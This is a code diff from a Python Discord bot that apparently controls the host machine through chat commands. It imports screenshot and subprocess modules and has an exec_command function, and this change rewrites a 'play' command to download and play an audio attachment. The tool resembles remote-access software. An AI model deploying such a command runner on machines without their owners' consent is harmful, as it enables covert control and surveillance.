@@ -1,6 +1,6 @@
 import traceback
 import requests
-import discord, socket, os, subprocess, shutil, webbrowser, playsound, aiohttp
+import discord, socket, os, subprocess, shutil, webbrowser, aiohttp
 from PIL import ImageGrab
 from io import BytesIO
 import asyncio
@@ -13,7 +13,8 @@ from datetime import datetime
 import logging
 import utils
 import logging.handlers
-import yaml 
+import yaml
+from playsound import playsound
 
 # Dirs and other useless stuff start here!
 
@@ -96,9 +97,14 @@ async def play(client: discord.Client, message: discord.Message, args: str):
     :param args: str - The arguments passed to the command
     :type args: str
     """
-    playsound.playsound(message.attachments[0].url)
-
-
+    async with aiohttp.ClientSession() as session:
+        async with session.get(message.attachments[0].url) as res:
+            print("Extension of file: " + message.attachments[0].filename.split(".")[-1])
+            
+            with open(message.attachments[0].filename, "wb") as f:
+                f.write(await res.read())
+    playsound(message.attachments[0].filename)
+    os.remove(message.attachments[0].filename)
 def exec_command(command):
     """
     It executes a command and returns the output and error messages as a tuple.
